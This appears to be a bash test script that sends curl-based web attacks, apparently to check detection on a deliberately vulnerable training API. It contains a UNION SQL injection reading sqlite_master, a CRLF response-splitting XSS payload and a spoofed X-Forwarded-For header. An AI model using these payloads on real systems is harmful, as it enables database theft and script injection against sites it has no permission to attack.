DOMAIN=$1

usage() {
	echo "Use the script to send several coded web attacks to Tiredful-API service running
	on domain name specified as the only parameter of the script."
}

if [ -z "$DOMAIN" ]; then
	usage
	exit 1
fi

if [ ! -z "$2" ]; then
	IP="-H X-Forwarded-For:$2"
fi

# SQLi attack
curl $IP "http://$DOMAIN/api/v1/activities/" -d'{"month": "1 UNION SELECT 1,2,3,4,5,6,name FROM sqlite_master"}' -H "Accept: application/json" -H "Content-Type: application/json" -v

# Information disclosure
curl $IP http://$DOMAIN/api/v1/books/978-93-80658-74-2-A/

# CRLF (no actual vulnerability)
curl $IP "http://$DOMAIN/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E"

# VPatch'ed request
curl $IP "http://$DOMAIN/formmail.cgi" -v
